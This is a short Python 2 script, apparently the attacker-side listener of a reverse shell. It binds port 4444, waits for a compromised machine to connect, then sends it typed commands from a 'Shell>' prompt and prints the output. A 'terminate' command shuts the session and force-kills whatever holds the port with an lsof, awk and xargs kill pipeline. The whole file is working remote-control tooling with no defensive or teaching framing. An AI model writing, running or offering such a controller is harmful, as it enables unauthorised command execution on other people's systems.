import socket 
import os
import platform

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 4444))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] We got a connection from: ', addr

	
	
	while True:

		command = raw_input("Shell> ")

		if 'terminate' in command:
			o_s = platform.system()
			conn.send('terminate')
			if o_s == 'Darwin' or o_s == 'Linux':
				os.system("lsof -i :4444 | awk 'NR!=1 {print $2}' | xargs kill")
			conn.close()
			s.close()
			break

		if len(command) > 0:
			conn.send(command)
			print conn.recv(1024)


def main():
	connect()
main()
